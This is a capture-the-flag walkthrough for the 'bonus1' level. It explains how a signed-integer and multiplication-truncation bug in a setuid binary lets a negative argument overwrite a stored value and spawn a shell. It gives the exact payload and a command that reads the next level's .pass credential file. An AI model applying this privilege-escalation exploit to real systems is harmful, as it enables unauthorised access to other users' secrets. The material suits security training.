bonus1 - walkthrough
====================

Target: /home/user/bonus1/bonus1   (setuid + setgid bonus2)
Goal:   read /home/user/bonus2/.pass

1. Recon (objdump -d bonus1), main():
     n = atoi(argv[1]);            ; stored at esp+0x3c
     if (n > 9) return 1;          ; SIGNED compare (jle) -> only blocks n>9
     memcpy(esp+0x14, argv[2], n*4);
     if (n == 0x574f4c46) execl("/bin/sh", "sh", NULL);
   Strings: execl("/bin/sh","sh",NULL)  (0x8048583 / 0x8048580).
   0x574f4c46 spelled little-endian is "FLOW".

2. The bug (signedness + truncation)
   n is a signed int, so a NEGATIVE n passes "n > 9". The size passed to
   memcpy is n*4, computed in 32 bits then used as an unsigned size_t.
   We want:
     (a) n <= 9  (signed)                 -> pass the check
     (b) n*4 (mod 2^32) = a small size     -> a survivable, useful copy length
     (c) enough bytes to overwrite the stored n at esp+0x3c

   The buffer is esp+0x14; the stored n is esp+0x3c, i.e. 40 bytes in. So we
   need to copy at least 44 bytes and put our value at offset 40.

   Pick n = -1073741813 = 0xC000000B:
     signed value <= 9                     -> OK
     n*4 = 0xC000000B << 2 = 0x2C = 44      (top two bits shift out)
   memcpy copies 44 bytes; bytes 40..43 overwrite the stored n.

3. Payload
   argv[1] = "-1073741813"
   argv[2] = "A"*40 + "FLOW"        (44 bytes; offset 40 = 0x574f4c46)
   After memcpy, n == 0x574f4c46 -> execl("/bin/sh","sh",NULL).

     $ echo 'cat /home/user/bonus2/.pass' | \
         ./bonus1 -1073741813 "$(python -c 'print "A"*40 + "FLOW"')"

